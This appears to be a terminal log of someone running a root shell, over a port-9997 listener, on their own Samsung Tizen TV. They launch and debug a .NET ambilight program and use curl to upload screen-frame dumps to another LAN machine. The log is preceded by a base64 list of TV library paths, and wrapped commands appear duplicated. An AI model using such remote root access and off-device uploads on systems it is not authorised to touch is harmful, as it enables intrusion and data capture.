11aS1jb25maWctbWFuYWdlci10di5zby4wLjEuMAAXAAAAL3Vzci9saWIvbGliQ0xvZ2dlci5zbwAeAAAAL3Vzci9saWIvbGliY2xvdXNlYXUuc28uMC4yLjAAJwAAAC91c3IvbGliL2xpYmNvbnRleHQtYXdhcmUtYXBpLnNvLjEuMS4wACQAAAAvdXNyL2xpYi9saWJjb250ZXh0LWF3YXJlLWNvbW1vbi5zbwAqAAAAL3Vzci9saWIvbGliY3luYXJhLWNyZWRzLWdkYnVzLnNvLjAuMTQuMjQALgAAAC91c3IvbGliL2xpYmRhbGktZXh0ZW5zaW9uLXR2LWNyZWF0ZS5zby4wLjEuMAAzAAAAL3Vzci9saWIvbGliZGFsaS1leHRlbnNpb24tdHYtdmVjdG9yLXZpZXcuc28uMC4xLjAAHgAAAC91c3IvbGliL2xpYmZlZWRiYWNrLnNvLjAuMS40ACIAAAAvdXNyL2xpYi9saWJmbHV4LW1hbmFnZXIuc28uMC4xLjAAKgAAAC91c3IvbGliL2xpYmZsdXhwb2xpY3ltYW5hZ2VyLXR2LnNvLjAuMS4wACEAAAAvdXNyL2xpYi9saWJtbWZrZXlzb3VuZC5zby4wLjAuMAApAAAAL3Vzci9saWIvbGlibnNzX3NlY3VyaXR5bWFuYWdlci5zby4yLjAuMAAfAAAAL3Vzci9saWIvbGlicnBjLXBvcnQuc28uMS4zLjI4ACsAAAAvdXNyL2xpYi9saWJzeXN0ZW0taW5mby1leHRlcm5hbC1wbHVnaW4uc28AKgAAAC91c3IvbGliL2xpYnRpemVuLXN1cmZhY2UtY2xpZW50LnNvLjAuMC4wAB0AAAAvdXNyL2xpYi9saWJ0cGwtZWdsLnNvLjEuNi45ACgAAAAvdXNyL2xpYi9saWJ3YXlsYW5kLXRibS1zZXJ2ZXIuc28uMC4wLjAAMwAAAC91c3Ivc2hhcmUvYXBwY29yZS9wbHVnaW5zL2xpYmFwcGNvcmUtdWktcGx1Z2luLnNvAA==                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
+owner     6627  4960  0 20:41 ?        00:00:00 /usr/bin/dotnet-loader           1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
+---
+1:WledAmbiPpi: 192.168.3.176:4048
+DIAG2
+bash-3.2# 
+[9997] controlador conectado
+setsid bash /home/owner/share/ambilight.sh </dev/null >/dev/null 2></owner/share/ambilight.sh </dev/null >/dev/null 2>&                         1 & disown; sleep 6; ps -<</dev/null >/dev/null 2>&1 & disown; sleep 6; ps -e                         f | grep -E "ambilight.sh< & disown; sleep 6; ps -ef | grep -E "ambilight.sh|                         WledAmbiPpi" | grep -v gr< | grep -E "ambilight.sh|WledAmbiPpi" | grep -v gre                         p | head -4; tail -4 /opt<ledAmbiPpi" | grep -v grep | head -4; tail -4 /opt/                         usr/home/owner/ppi.log; e< | head -4; tail -4 /opt/usr/home/owner/ppi.log; ec                         ho ALIVE
+[1] 8142
+f3200 avg=42ms 720x540
+f3300 avg=42ms 720x540
+f3400 avg=42ms 720x540
+f3500 avg=42ms 720x540
+ALIVE
+bash-3.2# 
+[9997] controlador conectado
+ps -ef | grep -E "ambilight.sh|WledAmbiPpi" | grep -v grep | head -<"ambilight.sh|WledAmbiPpi" | grep -v grep | head -5                         ; tail -5 /opt/usr/home/o< | grep -v grep | head -5; tail -5 /opt/usr/home/ow                         ner/ppi.log; echo CHECK2
+f3100 avg=42ms 720x540
+f3200 avg=42ms 720x540
+f3300 avg=42ms 720x540
+f3400 avg=42ms 720x540
+f3500 avg=42ms 720x540
+CHECK2
+bash-3.2# 
+[9997] controlador conectado
+ls -la /home/owner/share/ambilight.sh /home/owner/share/WledAmbiPpi<r/share/ambilight.sh /home/owner/share/WledAmbiPpi.                         exe; timeout 6 /usr/bin/d</owner/share/WledAmbiPpi.exe; timeout 6 /usr/bin/do                         tnet /home/owner/share/Wl<xe; timeout 6 /usr/bin/dotnet /home/owner/share/Wle                         dAmbiPpi.exe 192.168.3.17<net /home/owner/share/WledAmbiPpi.exe 192.168.3.176                          4048 20 hdr 2>&1 | head <AmbiPpi.exe 192.168.3.176 4048 20 hdr 2>&1 | head -                         10; echo FGDONE
+-rwxr-xr-x 1 root root   185 2026-10-27 20:46 /home/owner/share/ambilight.sh
+-rw-r--r-- 1 root root 13824 2026-10-27 20:47 /home/owner/share/WledAmbiPpi.exe
+bash: timeout: command not found
+FGDONE
+bash-3.2# 
+[9997] controlador conectado
+cd /home/owner/share && /usr/bin/dotnet WledAmbiPpi.exe 192.168.3.1<are && /usr/bin/dotnet WledAmbiPpi.exe 192.168.3.17                         6 4048 3 hdr 2>&1 | head <dAmbiPpi.exe 192.168.3.176 4048 3 hdr 2>&1 | head -                         12; echo FGTEST
+WledAmbiPpi: 192.168.3.176:4048
+FGTEST
+bash-3.2# 
+[9997] controlador conectado
+setsid nohup bash /home/owner/share/ambilight.sh </dev/null >/dev/n< /home/owner/share/ambilight.sh </dev/null >/dev/nu                         ll 2>&1 & sleep 8; ps -ef<ht.sh </dev/null >/dev/null 2>&1 & sleep 8; ps -ef                          | grep -E "ambilight|Wled<l 2>&1 & sleep 8; ps -ef | grep -E "ambilight|WledA                         mbi" | grep -v grep | hea< grep -E "ambilight|WledAmbi" | grep -v grep | head                          -5; tail -3 /opt/usr/hom<bi" | grep -v grep | head -5; tail -3 /opt/usr/home                         /owner/ppi.log; echo RELA<-5; tail -3 /opt/usr/home/owner/ppi.log; echo RELAU                         NCH2
+[1] 8620
+f3300 avg=42ms 720x540
+f3400 avg=42ms 720x540
+f3500 avg=42ms 720x540
+RELAUNCH2
+bash-3.2# 
+[9997] controlador conectado
+cd /home/owner/share && setsid /usr/bin/dotnet WledAmbiPpi.exe 192.<are && setsid /usr/bin/dotnet WledAmbiPpi.exe 192.1                         68.3.176 4048 -1 hdr >/op<net WledAmbiPpi.exe 192.168.3.176 4048 -1 hdr >/opt                         /usr/home/owner/ppi.log 2<8.3.176 4048 -1 hdr >/opt/usr/home/owner/ppi.log 2>                         &1 & sleep 8; ps -ef | gr<usr/home/owner/ppi.log 2>&1 & sleep 8; ps -ef | gre                         p WledAmbiPpi | grep -v g<1 & sleep 8; ps -ef | grep WledAmbiPpi | grep -v gr                         ep | head -3; tail -5 /op< WledAmbiPpi | grep -v grep | head -3; tail -5 /opt                         /usr/home/owner/ppi.log; <p | head -3; tail -5 /opt/usr/home/owner/ppi.log; e                         cho DIRECT
+[1] 8741
+root      8743  8741 24 20:54 ?        00:00:01 /usr/bin/dotnet WledAmbiPpi.exe 192.168.3.176 4048 -1 hdr
+WledAmbiPpi: 192.168.3.176:4048
+f100 avg=41ms 720x540
+DIRECT
+bash-3.2# 
+[9997] controlador conectado
+pkill -f WledAmbiPpi.exe; sleep 1; cd /home/owner/share && rm -f fr<Ppi.exe; sleep 1; cd /home/owner/share && rm -f fra                         me.y frame.c && /usr/bin/</owner/share && rm -f frame.y frame.c && /usr/bin/d                         otnet PpiDump.exe 2>&1 | <e.y frame.c && /usr/bin/dotnet PpiDump.exe 2>&1 | h                         ead -3 && curl -s -X PUT <tnet PpiDump.exe 2>&1 | head -3 && curl -s -X PUT -                         -data-binary @frame.y htt<ad -3 && curl -s -X PUT --data-binary @frame.y http                         ://192.168.3.200:8899/fra<data-binary @frame.y http://192.168.3.200:8899/fram                         e.y >/dev/null && curl -s<//192.168.3.200:8899/frame.y >/dev/null && curl -s                          -X PUT --data-binary @fra<.y >/dev/null && curl -s -X PUT --data-binary @fram                         e.c http://192.168.3.200:<X PUT --data-binary @frame.c http://192.168.3.200:8                         899/frame.c >/dev/null &&<.c http://192.168.3.200:8899/frame.c >/dev/null &&                          setsid /usr/bin/dotnet Wl<99/frame.c >/dev/null && setsid /usr/bin/dotnet Wle                         dAmbiPpi.exe 192.168.3.17<etsid /usr/bin/dotnet WledAmbiPpi.exe 192.168.3.176                          4048 -1 hdr >>/opt/usr/h<AmbiPpi.exe 192.168.3.176 4048 -1 hdr >>/opt/usr/ho                         me/owner/ppi.log 2>&1 & s<4048 -1 hdr >>/opt/usr/home/owner/ppi.log 2>&1 & sl                         eep 2; echo DUMP_OK
+[1] 10322
+r=0 720x540 ysz=518400 csz=518400
+dumped 518400+518400
+[8899] recv C:\Users\rpf16\q80a_debloat\kit\..\tools\tvbin\frame.y (518400)
+DUMP_OK
+bash-3.2# [8899] recv C:\Users\rpf16\q80a_debloat\kit\..\tools\tvbin\frame.c (518400)
+
+[9997] controlador conectado
+sed -i "s/ 4048 -1 hdr/ 4048 -1/" /home/owner/share/ambilight.sh &&<1 hdr/ 4048 -1/" /home/owner/share/ambilight.sh &&                          grep WledAmbiPpi /home/ow<er/share/ambilight.sh && grep WledAmbiPpi /home/own                         er/share/ambilight.sh; pk<rep WledAmbiPpi /home/owner/share/ambilight.sh; pki                         ll -f WledAmbiPpi.exe; sl<r/share/ambilight.sh; pkill -f WledAmbiPpi.exe; sle                         ep 1; cd /home/owner/shar<l -f WledAmbiPpi.exe; sleep 1; cd /home/owner/share                          && setsid /usr/bin/dotne<p 1; cd /home/owner/share && setsid /usr/bin/dotnet                          WledAmbiPpi.exe 192.168.<&& setsid /usr/bin/dotnet WledAmbiPpi.exe 192.168.3                         .176 4048 -1 >/opt/usr/ho<WledAmbiPpi.exe 192.168.3.176 4048 -1 >/opt/usr/hom                         e/owner/ppi.log 2>&1 & sl<176 4048 -1 >/opt/usr/home/owner/ppi.log 2>&1 & sle                         ep 5; tail -4 /opt/usr/ho</owner/ppi.log 2>&1 & sleep 5; tail -4 /opt/usr/hom                         e/owner/ppi.log; echo SDR<p 5; tail -4 /opt/usr/home/owner/ppi.log; echo SDR_                         DEPLOY
+  /usr/bin/dotnet /home/owner/share/WledAmbiPpi.exe 192.168.3.176 4048 -1 >> /opt/usr/home/owner/ppi.log 2>&1
+[1] 10582
+WledAmbiPpi: 192.168.3.176:4048
+f100 avg=27ms 720x540
+SDR_DEPLOY
+bash-3.2# 
